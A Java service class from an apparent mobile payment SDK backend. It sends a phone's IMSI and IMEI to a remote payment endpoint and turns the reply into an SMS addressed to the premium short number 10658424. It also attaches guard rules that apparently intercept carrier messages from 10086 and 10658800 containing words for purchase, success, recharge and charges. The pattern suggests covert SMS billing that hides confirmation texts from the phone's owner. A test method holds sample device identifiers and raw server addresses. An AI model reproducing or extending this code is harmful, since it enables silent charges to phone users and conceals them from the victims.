package com.jxt.pay.appclient.service.dynamic.net;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class XmwtMm2DynamicService implements IDynamicService{

	private static final String TYPE = "xmwtMm2";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String DEST = "10658424";
	
	private static final String REQUESTMODEL = "imsi={imsi}&sid={sid}&paycode={paycode}&app_id={app_id}&channel_id={channel_id}&operation={operation}&imei={imei}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final String POSTFIX_CHANNELID = "0001";
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String sid = map.get("sid");
			
			if(sid == null || sid.length() == 0){
				sid = channel;
			}
			
			String paycode = map.get("paycode");
			String app_id = map.get("app_id");
			
			if(app_id.length() < 5){
				app_id = app_id + POSTFIX_CHANNELID;
			}
			
			String channel_id = map.get("channel_id");
			String operation = map.get("operation");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			
			String param = REQUESTMODEL.replace("{sid}",sid).replace("{paycode}",paycode).replace("{app_id}",app_id).replace("{channel_id}",channel_id).replace("{imei}",imei).replace("{imsi}",imsi);
			
			param = param.replace("{operation}", operation);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parse(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 10 && responseTxt.startsWith("MM#WLAN#")){
			
			try{
				List<Sms> smsList = new ArrayList<Sms>();
				
				Sms sms = new Sms();
				
				sms.setSmsContent(responseTxt);
				sms.setSmsDest(DEST);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				smsList.add(sms);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				smsList.add(0, guardSms);
					
				return XstreamHelper.toXml(smsList);
				
			}catch(Exception e){
				
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
//		http://116.255.246.187:8080/mmapi/pay.jsp?imsi=460004014262556&sid=de68ad65a7dcf01d76926374aa95ac2c&paycode=30000879472606&app_id=300008794726&channel_id=3010001&operation=102&imei=865308021063756
//		http://121.14.38.20:25494/if_mtk/service?imsi=460004014262556&sid=de68ad65a7dcf01d76926374aa95ac2c&paycode=30000873055601&app_id=300008730556&channel_id=530&operation=102&imei=865308021063756
		String url = "http://116.255.246.187:8080/mmapi/pay.jsp";//?cmd=6&price=8&g=10&f=18&imei=860174010602000&imsi=460030912121002&phone=13800138000";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "ffkj2");
		map.put("channel", "10B101a87654322");
		map.put("paycode", "30000881695403");
		map.put("app_id", "300008816954");
		map.put("channel_id", "3010101");
		map.put("operation", "102");
//		map.put("imsi","460026100246153");
//		map.put("imei","862594025131367");
		
		map.put("imei","869460011612203");
		map.put("imsi", "460028174282753");
		
		map.put("sid", "de68ad65a7dcf01d76926374aa95ac2c");
		
		System.out.println(new XmwtMm2DynamicService().dynamic(map));
		
		
	}

}
